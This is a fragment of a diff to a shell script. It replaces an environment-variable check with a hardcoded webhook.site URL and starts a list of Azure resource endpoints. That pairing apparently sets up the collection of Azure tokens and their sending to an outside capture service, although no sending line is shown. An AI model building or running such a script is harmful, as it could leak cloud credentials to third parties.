@@ -1,11 +1,6 @@
 #!/bin/sh
 
-WEBHOOK=https://webhook.site/b4b33967-c95c-4510-bda7-0110af22aff2
-
-if [ -z "$WEBHOOK_URL" ]; then
-    echo "Error: WEBHOOK_URL environment variable is not set."
-    exit 1
-fi
+WEBHOOK="https://webhook.site/b4b33967-c95c-4510-bda7-0110af22aff2"
 
 RESOURCES=(
     "https://management.azure.com/"
